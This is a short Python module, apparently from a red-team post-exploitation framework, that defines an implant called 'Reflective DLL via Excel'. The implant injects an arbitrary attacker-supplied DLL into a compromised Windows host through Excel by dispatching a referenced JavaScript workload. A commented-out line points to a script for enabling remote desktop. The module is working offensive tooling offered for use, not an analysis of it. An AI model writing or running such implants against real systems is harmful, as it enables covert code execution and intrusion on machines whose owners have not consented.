import core.implant

class ExcelReflectJob(core.job.Job):
    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        pass
        #self.shell.print_plain(str(self.errno))

class ExcelReflectImplant(core.implant.Implant):

    NAME = "Reflective DLL via Excel"
    DESCRIPTION = "Executes an arbitrary reflective DLL."
    AUTHORS = ["RiskSense, Inc."]
    STATE = "implant/inject/reflectdll_excel"

    def load(self):
        self.options.register("DLLPATH", "", "the DLL to inject", required=True)

    def job(self):
        return ExcelReflectJob

    def run(self):
        workloads = {}
        #workloads["vbs"] = self.load_script("data/implant/manage/enable_rdesktop.vbs", self.options)
        workloads["js"] = "data/implant/inject/reflectdll_excel.js"

        self.dispatch(workloads, self.job)
